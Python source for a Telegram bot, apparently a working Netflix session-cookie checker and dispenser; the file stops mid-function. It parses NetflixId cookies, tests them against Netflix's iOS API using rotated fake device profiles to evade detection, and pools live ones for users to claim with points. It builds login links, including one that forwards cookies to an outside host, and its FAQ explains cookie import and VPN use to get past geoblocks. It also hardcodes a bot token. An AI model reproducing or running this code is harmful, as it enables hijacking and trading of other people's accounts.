import telebot
import pyzipper
import os
import re
import shutil
import urllib.parse
import time
import requests
import threading
import random
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from urllib3.exceptions import InsecureRequestWarning

# --- إعدادات البوت والتوكن ---
TOKEN = '8890151932:AAEMmm73E5r82FaSslWuRH96O8nSu-NBZ3o'
bot = telebot.TeleBot(TOKEN)

# 👑 إعدادات المطور (فارس)
DEVELOPER_CHAT_ID = 8713916851
DEVELOPER_USERNAME = "farxxes" 
CHANNEL_LINK = "https://t.me/farxxess"

# تعطيل تحذيرات SSL
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

COMMON_PASSWORDS = ["123", "1234", "admin", "cookies", "netflix", "premium", "troxdrop"]
BASE_TEMP_DIR = "final_output_temp"
if not os.path.exists(BASE_TEMP_DIR):
    os.makedirs(BASE_TEMP_DIR)

# --- قواعد البيانات المؤقتة في الذاكرة ---
VALID_COOKIES_POOL = []      
USED_COOKIES_HISTORY = set()
USER_DATABASE = {}  # { chat_id: {"points": 5, "username": "...", "role": "MEMBER", "lang": "ar"} }
BANNED_USERS = set()
active_scans = {}

# قوائم انتظار تنبيهات الشحن (Stock Alert System)
ALERT_WAITING_LIST = {
    "Basic": set(),
    "Standard": set(),
    "Premium": set()
}

# إحصائيات متقدمة لليوم الحالي
DAILY_STATS = {
    "active_users": set(),    
    "successful_checks": 0,   
    "current_day": datetime.now().strftime("%Y-%m-%d")
}

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

# 🛡️ نظام الـ Multi-Token والـ Multi-ESN لحماية البوت من الحظر والتوقف (طلبك)
NETFLIX_PROFILES = [
    {
        "ua": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
        "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
        "os_ver": "15.8.5", "model": "IPHONE8-1", "app_ver": "15.48.1"
    },
    {
        "ua": "Argo/16.10.0 (iPhone; iOS 16.3.1; Scale/3.00)",
        "esn": "NFAPPL-02-IPHONE13%3D2-PXA-03026U9VV5O8AUKEAEO5PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF5S5100",
        "os_ver": "16.3.1", "model": "IPHONE13-2", "app_ver": "16.10.0"
    },
    {
        "ua": "Argo/17.0.2 (iPad; iOS 17.2.0; Scale/2.00)",
        "esn": "NFAPPL-02-IPADM1%3D3-PXA-04026U9VV5O8AUKEAEO2PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF6S6200",
        "os_ver": "17.2.0", "model": "IPADM1-3", "app_ver": "17.0.2"
    },
    {
        "ua": "Argo/15.20.1 (iPhone; iOS 15.4.1; Scale=2.00)",
        "esn": "NFAPPL-02-IPHONE7%3D2-PXA-01026U9VV5O8AUKEAEO7PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF3S3100",
        "os_ver": "15.4.1", "model": "IPHONE7-2", "app_ver": "15.20.1"
    }
]

COUNTRY_FLAGS = {
    "US": "🇺🇸", "FR": "🇫🇷", "GB": "🇬🇧", "DE": "🇩🇪", "CA": "🇨🇦", 
    "AU": "🇦🇺", "TR": "🇹🇷", "ES": "🇪🇸", "IT": "🇮🇹", "BR": "🇧🇷",
    "DZ": "🇩🇿", "SA": "🇸🇦", "AE": "🇦🇪", "EG": "🇪🇬", "MA": "🇲🇦"
}

# قاموس اللغات لتبديل الواجهة بالكامل (Language Switcher)
LOCALIZATION = {
    "ar": {
        "welcome_new": "مرحباً بك في بوت نتفلكس الذكي الخاص بفارس 😉🔥\n\n🎁 كهدية ترحيبية، **تم منحك 5 نقاط مجانية** للتجربة فوراً!",
        "welcome_back": "مرحباً بك مجدداً في لوحة التحكم الخاصة بك المحدثة 👇",
        "btn_check": "🔍 فحص (ملف/نص/رابط)",
        "btn_dispense": "🎁 سحب رابط نتفلكس (عرض الجودات) 🪙",
        "btn_pool": "📊 فحص المخزن والنقاط",
        "btn_faq": "💡 قسم المساعدة والأسئلة الشائعة",
        "btn_lang": "🌐 Change to English",
        "btn_admin": "👑 لوحة تحكم المطور السريّة",
        "ban_msg": "❌ عذراً، تم حظرك من استخدام البوت من قبل الإدارة.",
        "no_cookies": "❌ لم يتم العثور على أي كوكيز صالحة للعمل.",
        "scanning": "⏳ جاري فحص واستخراج الكوكيز...\n\n(تم العثور على {} كوكيز وجاري المعالجة...)",
        "scan_status": "⏳ جاري الفحص: ({}/{})\n✅ شغال: {} | ❌ ميت: {} | ✂️ مكرر: {}",
        "scan_canceled": "🛑 تم إلغاء الفحص!\n✅ شغال: {} | ❌ ميت: {} | ✂️ مكرر: {}",
        "scan_done": "📊 **اكتمل الفحص والتصفية!**\n\n✅ المضاف للمخزن الجديد: {}\n❌ التالف: {}\n✂️ المكرر الشغال المرسل: {}\n\n🪙 رصيدك الحالي: {} نقطة 🪙",
        "send_txt_cap": "📁 ملف الحسابات الشغالة المجمعة الخريجة من الفحص الحالي 🔥",
        "btn_stop": "🛑 إيقاف الفحص",
        "pool_view": "📦 **حالة الحساب وتفاصيل المخزن الحالية:**\n\n👤 رصيدك الحالي: **{}**\n\n📊 **توزيع الحسابات الجاهزة بالمخزن:**\n🎬 فئة الـ Basic: {} حساب\n🔥 فئة الـ Standard: {} حساب\n👑 فئة الـ Premium 4K: {} حساب\n\n📦 إجمالي المتوفر بالمخزن: **{}** حساب جاهز للعمل.",
        "dispense_title": "📱 **مرحباً بك في قائمة السحب المخصصة حسب الجودة:**\n\nقم باختيار الفئة التي تريد سحبها بناءً على رصيدك المتاح حالياً.\n\n💳 رصيدك الحالي: **{}**\n📦 إجمالي المخزن المشترك: **{}** حساب جاهز.",
        "btn_home": "🔙 العودة للقائمة الرئيسية",
        "empty_category": "❌ عذراً، لا يوجد حسابات متوفرة حالياً في فئة `{}` بالوقت الحالي!",
        "btn_notify": "🔔 نبهني عند التعبئة",
        "notify_success": "✅ تم تفعيل التنبيه! سأقوم بإشعارك تلقائياً فور قيام فارس بشحن فئة {}.",
        "low_points": "❌ رصيد نقاطك لا يكفي لسحب هذه الفئة! تتطلب العملية {} نقاط على الأقل.",
        "no_points_all": "❌ رصيد نقاطك انتهى تماماً! يرجى التواصل مع فارس لشحن رصيدك.",
        "alert_shipped": "🔥 **أبشر يا غالي!** تم شحن فئة **{}** الآن في المخزن، يمكنك الدخول والسحب قبل نفاذ الكمية! 🏃‍♂️💨"
    },
    "en": {
        "welcome_new": "Welcome to Fares's Smart Netflix Bot 😉🔥\n\n🎁 As a welcome gift, **you've been granted 5 free points** to try it immediately!",
        "welcome_back": "Welcome back to your updated control panel 👇",
        "btn_check": "🔍 Check (File/Text/Link)",
        "btn_dispense": "🎁 Claim Netflix Link (View Qualities) 🪙",
        "btn_pool": "📊 Check Pool Status & Points",
        "btn_faq": "💡 Help & Interactive FAQ",
        "btn_lang": "🌐 تحويل إلى العربية",
        "btn_admin": "👑 Developer Admin Panel",
        "ban_msg": "❌ Sorry, you have been banned from using the bot by the administration.",
        "no_cookies": "❌ No valid cookies found to process.",
        "scanning": "⏳ Checking and extracting cookies...\n\n(Found {} cookies, processing...)",
        "scan_status": "⏳ Scanning: ({}/{})\n✅ Live: {} | ❌ Dead: {} | ✂️ Dup: {}",
        "scan_canceled": "🛑 Scan canceled!\n✅ Live: {} | ❌ Dead: {} | ✂️ Dup: {}",
        "scan_done": "📊 **Scan & Filtration Completed!**\n\n✅ Added to Pool: {}\n❌ Dead/Invalid: {}\n✂️ Duplicate Sent: {}\n\n🪙 Current Balance: {} Points 🪙",
        "send_txt_cap": "📁 File containing live accounts compiled from the current scan 🔥",
        "btn_stop": "🛑 Stop Scan",
        "pool_view": "📦 **Account Status & Pool Details:**\n\n👤 Your Balance: **{}**\n\n📊 **Live Accounts Distribution:**\n🎬 Basic Plan: {} accounts\n🔥 Standard Plan: {} accounts\n👑 Premium 4K Plan: {} accounts\n\n📦 Total in Shared Pool: **{}** ready accounts.",
        "dispense_title": "📱 **Welcome to Quality Selection Dispense Menu:**\n\nSelect the plan you want to claim based on your available balance.\n\n💳 Your Balance: **{}**\n📦 Shared Pool Total: **{}** accounts.",
        "btn_home": "🔙 Back to Main Menu",
        "empty_category": "❌ Sorry, there are currently no accounts available in the `{}` plan!",
        "btn_notify": "🔔 Notify Me on Restock",
        "notify_success": "✅ Alert activated! I will automatically message you once Fares restocks the {} plan.",
        "low_points": "❌ Your points balance is insufficient! This plan requires at least {} points.",
        "no_points_all": "❌ Your points balance is completely empty! Please contact Fares to refill.",
        "alert_shipped": "🔥 **Good news!** The **{}** plan has just been restocked in the pool. Log in and claim yours before it runs out! 🏃‍♂️💨"
    }
}

def get_flag(country_code):
    if not country_code:
        return "🏳️"
    return COUNTRY_FLAGS.get(country_code.upper(), f"[{country_code.upper()}]")

def check_ban(func):
    def wrapper(message, *args, **kwargs):
        try:
            chat_id = message.chat.id if hasattr(message, 'chat') else message.message.chat.id
        except Exception:
            chat_id = message.message.chat.id
        
        check_and_reset_daily_stats()
        DAILY_STATS["active_users"].add(chat_id)

        if chat_id not in USER_DATABASE:
            USER_DATABASE[chat_id] = {"points": 5, "username": "", "role": "MEMBER", "lang": "ar"}

        if chat_id in BANNED_USERS:
            lang = USER_DATABASE[chat_id].get("lang", "ar")
            bot.send_message(chat_id, LOCALIZATION[lang]["ban_msg"])
            return
        return func(message, *args, **kwargs)
    return wrapper

def check_and_reset_daily_stats():
    today = datetime.now().strftime("%Y-%m-%d")
    if DAILY_STATS["current_day"] != today:
        DAILY_STATS["active_users"].clear()
        DAILY_STATS["successful_checks"] = 0
        DAILY_STATS["current_day"] = today

def extract_clean_netflix_ids(text):
    cleaned_ids = []
    netscape_matches = re.findall(r"NetflixId\s+([^\s\n\r]+)", text)
    for val in netscape_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    standard_matches = re.findall(r"NetflixId=([^;\s\n`]+)", text)
    for val in standard_matches:
        decoded = urllib.parse.unquote(val) if "%" in val else val
        if decoded not in cleaned_ids and len(decoded) > 20:
            cleaned_ids.append(decoded)
    return cleaned_ids

def check_netflix_cookie_detailed(netflix_id):
    # 🎲 تدوير الـ ESN والـ User-Agent عشوائياً لحماية البوت من كشف نتفلكس (طلبك)
    profile = random.choice(NETFLIX_PROFILES)
    
    query_params = {
        "appVersion": profile["app_ver"],
        "device_type": "NFAPPL-02-",
        "esn": profile["esn"],
        "idiom": "phone",
        "iosVersion": profile["os_ver"],
        "modelType": profile["model"],
        "path": '["account","token","default"]',
        "pathFormat": "graph",
        "responseFormat": "json",
    }
    
    headers = {
        "User-Agent": profile["ua"],
        "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
        "x-netflix.client.ftl.esn": urllib.parse.unquote(profile["esn"]),
        "x-netflix.client.appversion": profile["app_ver"],
        "accept-language": "en-US;q=1",
        "Cookie": f"NetflixId={netflix_id}"
    }
    
    try:
        response = requests.get(API_URL, params=query_params, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            data = response.json()
            value_data = data.get("value", {})
            account_info = value_data.get("account", {}).get("token", {}).get("default", {})
            token = account_info.get("token")
            expires = account_info.get("expires")
            
            video_quality = value_data.get("videoQuality", "SD") 
            country_code = value_data.get("geoBlockStatus", {}).get("countryCode", "US")
            
            if video_quality == "UHD":
                plan_name = "Premium (4K)"
            elif video_quality == "FHD" or video_quality == "HD":
                plan_name = "Standard (HD)"
            else:
                plan_name = "Basic (SD)"

            if token:
                membership_status = value_data.get("membershipStatus", "UNKNOWN")
                is_on_hold = value_data.get("accountHold", False) or value_data.get("isInHoldStatus", False)
                geoblock_status = value_data.get("geoBlockStatus", {})
                if membership_status != "FORMER_MEMBER" and not is_on_hold and not geoblock_status.get("isBlocked", False):
                    DAILY_STATS["successful_checks"] += 1
                    return {"token": token, "expires": expires, "bypass": False, "plan": plan_name, "country": country_code}
        
        fallback_url = "https://www.netflix.com/YourAccount"
        res_fallback = requests.get(fallback_url, headers={"User-Agent": "Mozilla/5.0", "Cookie": f"NetflixId={netflix_id}"}, timeout=8, allow_redirects=False)
        if res_fallback.status_code in [200, 302] and "login" not in res_fallback.headers.get("Location", "").lower():
            DAILY_STATS["successful_checks"] += 1
            return {"token": "BYPASS_VALID_OK", "expires": int(time.time()) + 2592000, "bypass": True, "plan": "Standard (HD)", "country": "US"}
        return None
    except Exception:
        return None

# دالة ذكية لإشعار المستخدمين المنتظرين عند تعبئة المخزن (Stock Alert System)
def check_and_trigger_stock_alerts(shipped_plans_detected):
    for plan in shipped_plans_detected:
        waiting_users = list(ALERT_WAITING_LIST[plan])
        if waiting_users:
            for uid in waiting_users:
                try:
                    lang = USER_DATABASE.get(uid, {}).get("lang", "ar")
                    bot.send_message(uid, LOCALIZATION[lang]["alert_shipped"].format(plan), parse_mode="Markdown")
                except Exception:
                    pass
            ALERT_WAITING_LIST[plan].clear()

def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_name):
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    total_count = len(netflix_ids)
    active_scans[chat_id] = True
    clean_source_name = source_name.replace("_", "\\_").replace("*", "\\*").replace("`", "\\`").replace("[", "\\[")
    live_accounts_accumulator = []
    
    stop_markup = InlineKeyboardMarkup().add(InlineKeyboardButton(LOCALIZATION[lang]["btn_stop"], callback_data=f"stop_scan_{chat_id}"))
    status = bot.send_message(chat_id, LOCALIZATION[lang]["scanning"].format(total_count), reply_to_message_id=reply_to_message_id, reply_markup=stop_markup)
    live_count, dead_count, dup_count = 0, 0, 0
    shipped_plans_detected = set()

    for index, netflix_id in enumerate(netflix_ids, start=1):
        if not active_scans.get(chat_id, False):
            safe_send_message(chat_id, LOCALIZATION[lang]["scan_canceled"].format(live_count, dead_count, dup_count))
            return

        is_duplicate = netflix_id in USED_COOKIES_HISTORY

        if index % 5 == 0 or index == total_count:
            try:
                bot.edit_message_text(LOCALIZATION[lang]["scan_status"].format(index, total_count, live_count, dead_count, dup_count), chat_id, status.message_id, reply_markup=stop_markup)
            except Exception:
                pass

        result = check_netflix_cookie_detailed(netflix_id)
        if result:
            if is_duplicate:
                dup_count += 1
            else:
                live_count += 1
                USED_COOKIES_HISTORY.add(netflix_id)
                
                if "Basic" in result["plan"]:
                    shipped_plans_detected.add("Basic")
                elif "Standard" in result["plan"]:
                    shipped_plans_detected.add("Standard")
                elif "Premium" in result["plan"]:
                    shipped_plans_detected.add("Premium")

                if not any(item['cookie'] == netflix_id for item in VALID_COOKIES_POOL):
                    VALID_COOKIES_POOL.append({
                        "cookie": netflix_id,
                        "plan": result["plan"],
                        "country": result["country"]
                    })

            token = result["token"]
            expires = result["expires"]
            if isinstance(expires, int) and len(str(expires)) == 13:
                expires //= 1000
            date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
            full_cookie_string = f"NetflixId={netflix_id}"
            direct_netflix_url = "https://www.netflix.com/" if result["bypass"] else f"https://netflix.com/?nftoken={token}"
            encoded_cookie = urllib.parse.quote(full_cookie_string)
            bridge_login_url = f"https://nftokengen-7ik6.onrender.com/nf/netflix?cookie={encoded_cookie}"
            dup_tag = " (Duplicate)" if is_duplicate else ""
            
            flag = get_flag(result["country"])
            res_text = (
                f"🌟 **PREMIUM ACCOUNT{dup_tag}** 🌟\n\n"
                f"📁 Source: {clean_source_name}\n"
                f"💎 Plan Quality: `{result['plan']}`\n"
                f"🌍 Country Geo: {flag} ({result['country'].upper()})\n"
                f"• Expiry date: {date_str}\n\n"
                f"🔗 Direct Link:\n{direct_netflix_url}"
            )
            txt_entry = f"Cookie: {full_cookie_string}\nPlan: {result['plan']} | Country: {result['country']}\nURL: {direct_netflix_url}\n====================\n\n"
            live_accounts_accumulator.append(txt_entry)
            markup = InlineKeyboardMarkup().add(InlineKeyboardButton("💻 PC Login", url=direct_netflix_url), InlineKeyboardButton("📱 Phone Login", url=bridge_login_url))
            safe_send_message(chat_id, res_text, markup)
            time.sleep(1.2)
        else:
            if is_duplicate:
                USED_COOKIES_HISTORY.discard(netflix_id)
                VALID_COOKIES_POOL = [item for item in VALID_COOKIES_POOL if item["cookie"] != netflix_id]
            dead_count += 1
        time.sleep(0.1)

    active_scans.pop(chat_id, None)
    safe_send_message(chat_id, LOCALIZATION[lang]["scan_done"].format(live_count, dead_count, dup_count, USER_DATABASE[chat_id]['points']))
    if live_accounts_accumulator:
        send_txt_file(chat_id, live_accounts_accumulator, source_name)
    
    # تشغيل تنبيهات المشتركين إذا تم رصد جودة كانوا ينتظرونها
    if shipped_plans_detected:
        threading.Thread(target=check_and_trigger_stock_alerts, args=(shipped_plans_detected,), daemon=True).start()

def process_cookies_list_and_check(chat_id, netflix_ids, reply_to_message_id, source_name="Cookies_File.txt"):
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    if not netflix_ids:
        safe_send_message(chat_id, LOCALIZATION[lang]["no_cookies"])
        return
    threading.Thread(
        target=_threaded_cookies_check,
        args=(chat_id, netflix_ids, reply_to_message_id, source_name),
        daemon=True
    ).start()

def send_txt_file(chat_id, accounts_list, original_filename):
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    try:
        clean_name = os.path.splitext(original_filename)[0]
        output_txt_path = os.path.join(BASE_TEMP_DIR, f"{clean_name}_LIVE.txt")
        with open(output_txt_path, 'w', encoding='utf-8') as f:
            for item in accounts_list:
                f.write(item)
        with open(output_txt_path, 'rb') as doc:
            bot.send_document(chat_id, doc, caption=LOCALIZATION[lang]["send_txt_cap"])
        if os.path.exists(output_txt_path):
            os.remove(output_txt_path)
    except Exception as e:
        print(e)

def safe_send_message(chat_id, text, markup=None):
    while True:
        try:
            return bot.send_message(chat_id, text, reply_markup=markup, disable_web_page_preview=True, parse_mode="Markdown")
        except telebot.apihelper.ApiTelegramException as e:
            if e.error_code == 429:
                retry_after = int(re.search(r'retry after (\d+)', e.description).group(1)) if re.search(r'retry after (\d+)', e.description) else 5
                time.sleep(retry_after + 1)
            else:
                break
    return None

def generate_main_keyboard(user_id):
    lang = USER_DATABASE.get(user_id, {}).get("lang", "ar")
    points = USER_DATABASE.get(user_id, {}).get("points", 5)
    role = USER_DATABASE.get(user_id, {}).get("role", "MEMBER")
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    
    markup.add(
        InlineKeyboardButton(LOCALIZATION[lang]["btn_check"], callback_data="menu_check"),
        InlineKeyboardButton(LOCALIZATION[lang]["btn_dispense"], callback_data="open_dispense_menu"),
        InlineKeyboardButton(LOCALIZATION[lang]["btn_pool"], callback_data="check_pool_status"),
        InlineKeyboardButton(LOCALIZATION[lang]["btn_faq"], callback_data="open_faq_menu"),
        InlineKeyboardButton(LOCALIZATION[lang]["btn_lang"], callback_data="toggle_language")
    )
    if user_id == DEVELOPER_CHAT_ID:
        markup.add(InlineKeyboardButton(LOCALIZATION[lang]["btn_admin"], callback_data="open_admin_panel"))
    return markup

@bot.message_handler(commands=['start'])
@check_ban
def send_welcome(message):
    chat_id = message.chat.id
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    if USER_DATABASE[chat_id]["username"] == "":
        USER_DATABASE[chat_id]["username"] = message.from_user.username or ""
        welcome_txt = LOCALIZATION[lang]["welcome_new"]
    else:
        welcome_txt = LOCALIZATION[lang]["welcome_back"]
    bot.reply_to(message, welcome_txt, reply_markup=generate_main_keyboard(chat_id))

# زر تغيير اللغة الفوري (Language Switcher)
@bot.callback_query_handler(func=lambda call: call.data == "toggle_language")
@check_ban
def toggle_language_callback(call):
    chat_id = call.message.chat.id
    current_lang = USER_DATABASE[chat_id].get("lang", "ar")
    new_lang = "en" if current_lang == "ar" else "ar"
    USER_DATABASE[chat_id]["lang"] = new_lang
    bot.answer_callback_query(call.id, "✅ Language Updated!" if new_lang == "en" else "✅ تم تحديث اللغة للقرابة العربية!")
    bot.edit_message_text(LOCALIZATION[new_lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))

# 💡 قسم المساعدة والأسئلة الشائعة التفاعلي (Interactive FAQ)
@bot.callback_query_handler(func=lambda call: call.data == "open_faq_menu")
@check_ban
def open_faq_menu(call):
    chat_id = call.message.chat.id
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    bot.answer_callback_query(call.id)
    
    faq_markup = InlineKeyboardMarkup()
    faq_markup.row_width = 1
    if lang == "ar":
        faq_markup.add(
            InlineKeyboardButton("📱 كيف أشغل الكوكيز على الهاتف؟", callback_data="faq_answer_phone"),
            InlineKeyboardButton("💻 كيف أشغل الكوكيز على الكمبيوتر؟", callback_data="faq_answer_pc"),
            InlineKeyboardButton("🌍 الرابط يطلب VPN، ماذا أفعل؟", callback_data="faq_answer_vpn"),
            InlineKeyboardButton(LOCALIZATION[lang]["btn_home"], callback_data="back_to_home")
        )
        text = "💡 **قسم المساعدة والإجابة على الاستفسارات الشائعة:**\n\nاضغط على أي سؤال بالأسفل لتلقي الشرح فوراً وبسهولة."
    else:
        faq_markup.add(
            InlineKeyboardButton("📱 How to use cookies on Phone?", callback_data="faq_answer_phone"),
            InlineKeyboardButton("💻 How to use cookies on PC?", callback_data="faq_answer_pc"),
            InlineKeyboardButton("🌍 Link requires VPN, what to do?", callback_data="faq_answer_vpn"),
            InlineKeyboardButton(LOCALIZATION[lang]["btn_home"], callback_data="back_to_home")
        )
        text = "💡 **Help & Interactive FAQ Section:**\n\nClick on any question below to view the tutorial instantly."
        
    bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=faq_markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('faq_answer_'))
@check_ban
def handle_faq_answers(call):
    chat_id = call.message.chat.id
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    q_type = call.data.split('_')[2]
    bot.answer_callback_query(call.id)
    
    back_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙", callback_data="open_faq_menu"))
    
    if q_type == "phone":
        if lang == "ar":
            ans = "📱 **طريقة تشغيل الرابط على الهاتف:**\n\n1. عند السحب، اضغط على زر **Phone Login**.\n2. سيفتح معك متصفح البوت تلقائياً ويقوم بتسجيل دخولك فوراً دون كتابة إيميل أو باسوورد.\n3. تأكد من تحميل تطبيق Netflix الرسمي على هاتفك."
        else:
            ans = "📱 **How to use on Mobile Phone:**\n\n1. When claiming, click on the **Phone Login** button.\n2. The bot link will open and bypass the logging page securely.\n3. Make sure you have the official Netflix App installed on your device."
    elif q_type == "pc":
        if lang == "ar":
            ans = "💻 **طريقة تشغيل الرابط على الكمبيوتر:**\n\n1. قم بتحميل إضافة لتصفح الكوكيز على متصفحك (مثل `Cookie-Editor`).\n2. انسخ الكوكيز النصي المستخرج وضعه داخل الإضافة.\n3. قم بعمل تحديث (Refresh) لموقع نتفلكس وستجد نفسك بداخل الحساب."
        else:
            ans = "💻 **How to use on PC/Computer:**\n\n1. Download a cookie extension on your browser (e.g., `Cookie-Editor`).\n2. Copy the full exported text token and import it into the extension.\n3. Refresh the Netflix homepage and you will be logged in."
    else: # vpn
        if lang == "ar":
            ans = "🌍 **حل مشكلة طلب الـ VPN أو حظر الدولة:**\n\nبعض الكوكيز تكون مقيدة بدول معينة (مثل أمريكا 🇺🇸 أو فرنسا 🇫🇷) وتتطلب تشغيل VPN على تلك الدولة حتى يعمل الرابط بسلاسة. نقترح عليك استخدام تطبيق VPN مجاني قوي مثل `Windscribe` أو `ProtonVPN` وتغيير الموقع لعلم الدولة الموضح بجانب الحساب."
        else:
            ans = "🌍 **Bypass VPN / Geoblock restriction:**\n\nSome cookies require a specific country proxy to run smoothly (e.g. USA 🇺🇸 or France 🇫🇷) which is displayed next to the account flag. We highly recommend using a free secure VPN like `Windscribe` or `ProtonVPN` matching the account origin."
            
    bot.send_message(chat_id, ans, reply_markup=back_markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "open_dispense_menu")
@check_ban
def open_dispense_menu(call):
    chat_id = call.message.chat.id
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    bot.answer_callback_query(call.id)
    
    basic_count = sum(1 for x in VALID_COOKIES_POOL if "Basic" in x["plan"])
    standard_count = sum(1 for x in VALID_COOKIES_POOL if "Standard" in x["plan"])
    premium_count = sum(1 for x in VALID_COOKIES_POOL if "Premium" in x["plan"])
    
    role = USER_DATABASE.get(chat_id, {}).get("role", "MEMBER")
    current_pts = "♾️" if chat_id == DEVELOPER_CHAT_ID else ("💎 VIP" if role == "VIP" else f"{USER_DATABASE.get(chat_id, {}).get('points', 0)} 🪙")
    
    dispense_markup = InlineKeyboardMarkup()
    dispense_markup.row_width = 1
    
    dispense_markup.add(
        InlineKeyboardButton(f"🎬 Basic (Cost: 1 Pt) | Stock: {basic_count}" if lang == "en" else f"🎬 فئة Basic (التكلفة: 1 نقطة) | المتوفر: {basic_count}", callback_data="grab_plan_Basic"),
        InlineKeyboardButton(f"🔥 Standard (Cost: 2 Pts) | Stock: {standard_count}" if lang == "en" else f"🔥 فئة Standard (التكلفة: 2 نقاط) | المتوفر: {standard_count}", callback_data="grab_plan_Standard"),
        InlineKeyboardButton(f"👑 Premium 4K (Cost: 3 Pts) | Stock: {premium_count}" if lang == "en" else f"👑 فئة Premium 4K (التكلفة: 3 نقاط) | المتوفر: {premium_count}", callback_data="grab_plan_Premium"),
        InlineKeyboardButton(LOCALIZATION[lang]["btn_home"], callback_data="back_to_home")
    )
    
    bot.edit_message_text(
        LOCALIZATION[lang]["dispense_title"].format(current_pts, len(VALID_COOKIES_POOL)),
        chat_id, call.message.message_id, reply_markup=dispense_markup
    )

@bot.callback_query_handler(func=lambda call: call.data == "back_to_home")
@check_ban
def back_to_home_btn(call):
    chat_id = call.message.chat.id
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    bot.answer_callback_query(call.id)
    bot.edit_message_text(LOCALIZATION[lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))

# منطق السحب والخصم ونظام التنبيه التلقائي المضاف (Stock Alert System)
def execute_graded_dispense_logic(chat_id, selected_plan_prefix):
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    role = USER_DATABASE[chat_id]["role"]
    
    if selected_plan_prefix == "Basic":
        cost = 1
    elif selected_plan_prefix == "Standard":
        cost = 2
    else:  
        cost = 3
        
    if chat_id != DEVELOPER_CHAT_ID and role != "VIP" and USER_DATABASE[chat_id]["points"] < cost:
        return {"status": "no_points", "cost": cost}
        
    target_index = None
    for idx, item in enumerate(VALID_COOKIES_POOL):
        if selected_plan_prefix in item["plan"]:
            target_index = idx
            break
            
    # إذا كانت الفئة فارغة نقوم بتوفير خيار الاشتراك بالتنبيهات (Stock Alert) لراحة مستخدمك
    if target_index is None:
        alert_markup = InlineKeyboardMarkup().add(
            InlineKeyboardButton(LOCALIZATION[lang]["btn_notify"], callback_data=f"activate_alert_{selected_plan_prefix}"),
            InlineKeyboardButton(LOCALIZATION[lang]["btn_home"], callback_data="back_to_home")
        )
        return {"status": "empty", "message": LOCALIZATION[lang]["empty_category"].format(selected_plan_prefix), "markup": alert_markup}
        
    item = VALID_COOKIES_POOL.pop(target_index)
    current_cookie = item["cookie"]
    fresh_result = check_netflix_cookie_detailed(current_cookie)
    
    if fresh_result:
        if chat_id != DEVELOPER_CHAT_ID and role != "VIP":
            USER_DATABASE[chat_id]["points"] -= cost
            
        token = fresh_result["token"]
        expires = fresh_result["expires"]
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        date_str = datetime.fromtimestamp(expires).strftime('%d %B %Y') if expires else "Unknown"
        full_cookie_string = f"NetflixId={current_cookie}"
        direct_netflix_url = "https://www.netflix.com/" if fresh_result["bypass"] else f"https://netflix.com/?nftoken={token}"
        short_id = current_cookie[:20]
        
        if lang == "ar":
            points_display = "♾️ وضع المطور" if chat_id == DEVELOPER_CHAT_ID else ("💎 رتبة VIP" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} نقطة")
            success_text = (
                f"🎉 **تفدّل رابط نتفلكس الطازج المختار** 🎉\n\n"
                f"💎 **جودة الاشتراك المكسوب:** `{fresh_result['plan']}`\n"
                f"🌍 **الدولة ونوع الـ VPN المطلوبة:** {get_flag(fresh_result['country'])} ({fresh_result['country'].upper()})\n"
                f"📅 **تاريخ الفواتير القادم:** {date_str}\n"
                f"🪙 رصيدك المتبقي الحالي: {points_display}.\n"
                f"💰 تكلفة عملية السحب الحالية: **{cost} نقاط**.\n\n"
                f"🔗 **رابط الدخول المباشر الموقت:**\n{direct_netflix_url}\n\n"
                f"🤔 **هل اشتغل معك الرابط بدون مشاكل؟** يرجى التقييم بالأسفل 👇"
            )
        else:
            points_display = "♾️ Dev Mode" if chat_id == DEVELOPER_CHAT_ID else ("💎 VIP Status" if role == "VIP" else f"{USER_DATABASE[chat_id]['points']} Points")
            success_text = (
                f"🎉 **Here is your freshly claimed Netflix link!** 🎉\n\n"
                f"💎 **Subscription Quality:** `{fresh_result['plan']}`\n"
                f"🌍 **Country & VPN Required:** {get_flag(fresh_result['country'])} ({fresh_result['country'].upper()})\n"
                f"📅 **Next billing date:** {date_str}\n"
                f"🪙 Remaining Balance: {points_display}.\n"
                f"💰 Action Cost: **{cost} points**.\n\n"
                f"🔗 **Direct Secure Link:**\n{direct_netflix_url}"
            )
            
